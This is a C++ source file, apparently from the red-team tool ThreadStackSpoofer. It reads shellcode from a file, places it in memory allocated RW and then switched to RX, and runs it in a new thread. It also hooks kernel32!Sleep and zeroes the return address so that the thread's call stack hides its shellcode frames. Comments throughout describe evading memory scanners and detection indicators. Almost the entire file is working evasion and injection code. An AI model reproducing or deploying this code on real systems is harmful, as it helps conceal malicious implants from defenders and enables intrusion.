
#include "header.h"
#include <intrin.h>

HookedSleep g_hookedSleep;


void WINAPI MySleep(DWORD _dwMilliseconds)
{
    const register DWORD dwMilliseconds = _dwMilliseconds;

    //
    // Locate this stack frame's return address.
    // 
    PULONG_PTR overwrite = (PULONG_PTR)_AddressOfReturnAddress();
    const register ULONG_PTR origReturnAddress = *overwrite;

    log("[>] Original return address: 0x", 
        std::hex, std::setw(8), std::setfill('0'), origReturnAddress, 
        ". Finishing call stack...");

    //
    // By overwriting the return address with 0 we're basically telling call stack unwinding algorithm
    // to stop unwinding call stack any further, as there further frames. This we can hide our remaining stack frames
    // referencing shellcode memory allocation from residing on a call stack.
    //
    *overwrite = 0;

    log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");

    // Perform sleep emulating originally hooked functionality.
    ::SleepEx(dwMilliseconds, false);

    // Restore original thread's call stack.
    log("[<] Restoring original return address...");
    *overwrite = origReturnAddress;
}

bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
{
#ifdef _WIN64
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));
#else
    uint8_t trampoline[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
        0xFF, 0xE0                        // jmp eax
    };

    uint32_t addr = (uint32_t)(jumpAddress);
    memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook)
    {
        if (buffers != NULL)
        {
            if (buffers->previousBytes == nullptr || buffers->previousBytesSize == 0)
                return false;

            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
        }

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else
    {
        if (buffers == NULL)
            return false;

        if (buffers->originalBytes == nullptr || buffers->originalBytesSize == 0)
            return false;

        dwSize = buffers->originalBytesSize;

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    static typeNtFlushInstructionCache pNtFlushInstructionCache = NULL;
    if (!pNtFlushInstructionCache)
        pNtFlushInstructionCache = (typeNtFlushInstructionCache)
            GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");

    //
    // We're flushing instructions cache just in case our hook didn't kick in immediately.
    //
    if (pNtFlushInstructionCache)
        pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);

    ::VirtualProtect(
        addressToHook,
        dwSize,
        oldProt,
        &oldProt
    );

    return output;
}

bool hookSleep()
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = g_hookedSleep.sleepStub;
    buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

    g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(Sleep);

    if (!fastTrampoline(true, (BYTE*)::Sleep, &MySleep, &buffers))
        return false;

    return true;
}

bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
{
    HandlePtr file(CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    ), &::CloseHandle);

    if (INVALID_HANDLE_VALUE == file.get())
        return false;

    DWORD highSize;
    DWORD readBytes = 0;
    DWORD lowSize = GetFileSize(file.get(), &highSize);

    shellcode.resize(lowSize, 0);

    return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
}

void runShellcode(LPVOID param)
{
    auto func = ((void(*)())param);

    //
    // Jumping to shellcode. Look at the coment in injectShellcode() describing why we opted to jump
    // into shellcode in a classical manner instead of fancy hooking 
    // ntdll!RtlUserThreadStart+0x21 like in ThreadStackSpoofer example.
    //
    func();
}

bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
{
    //
    // Firstly we allocate RW page to avoid RWX-based IOC detections
    //
    auto alloc = ::VirtualAlloc(
        NULL,
        shellcode.size() + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );

    if (!alloc)
        return false;

    memcpy(alloc, shellcode.data(), shellcode.size());

    DWORD old;

    //
    // Then we change that protection to RX
    // 
    if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
        return false;

    /*
    * We're not setting these pointers to let the hooked sleep handler figure them out itself.
    *
    g_fluctuationData.shellcodeAddr = alloc;
    g_fluctuationData.shellcodeSize = shellcode.size();
    g_fluctuationData.protect = Shellcode_Memory_Protection;
    */

    shellcode.clear();

    //
    // Example provided in previous release of ThreadStackSpoofer:
    //      https://github.com/mgeeky/ThreadStackSpoofer/blob/ec0237c5f8b1acd052d57562a43f40a20752b5ca/ThreadStackSpoofer/main.cpp#L417
    // showed how we can start our shellcode from temporarily hooked ntdll!RtlUserThreadStart+0x21 .
    // 
    // That approached was a bit flawed due to the fact, the as soon as we introduce a hook within module,
    // even when we immediately unhook it the system allocates a page of memory (4096 bytes) of type MEM_PRIVATE
    // inside of a shared library allocation that comprises of MEM_IMAGE/MEM_MAPPED pool. 
    // 
    // Memory scanners such as Moneta are sensitive to scanning memory mapped PE DLLs and finding amount of memory
    // labeled as MEM_PRIVATE within their region, considering this (correctly!) as a "Modified Code" anomaly.
    // 
    // We're unable to evade this detection for kernel32!Sleep however we can when it comes to ntdll. Instead of
    // running our shellcode from a legitimate user thread callback, we can simply run a thread pointing to our
    // method and we'll instead jump to the shellcode from that method.
    // 
    // After discussion I had with @waldoirc we came to the conclusion that in order not to bring other IOCs it is better
    // to start shellcode from within EXE's own code space, thus avoiding detections based on `ntdll!RtlUserThreadStart+0x21` 
    // being an outstanding anomaly in some environments. Shout out to @waldoirc for our really long discussion!
    //
    thread.reset(::CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)runShellcode,
        alloc,
        0,
        0
    ));

    return (NULL != thread.get());
}

int main(int argc, char** argv)
{
    if (argc < 3)
    {
        log("Usage: ThreadStackSpoofer.exe <shellcode> <spoof>");
        return 1;
    }

    std::vector<uint8_t> shellcode;
    bool spoof = (!strcmp(argv[2], "true") || !strcmp(argv[2], "1"));

    log("[.] Reading shellcode bytes...");
    if (!readShellcode(argv[1], shellcode))
    {
        log("[!] Could not open shellcode file! Error: ", ::GetLastError());
        return 1;
    }

    if (spoof)
    {
        log("[.] Hooking kernel32!Sleep...");
        if (!hookSleep())
        {
            log("[!] Could not hook kernel32!Sleep!");
            return 1;
        }
    }
    else
    {
        log("[.] Thread call stack will NOT be spoofed.");
    }

    log("[.] Injecting shellcode...");

    HandlePtr thread(NULL, &::CloseHandle);
    if (!injectShellcode(shellcode, thread))
    {
        log("[!] Could not inject shellcode! Error: ", ::GetLastError());
        return 1;
    }

    log("[+] Shellcode is now running.");

    WaitForSingleObject(thread.get(), INFINITE);
}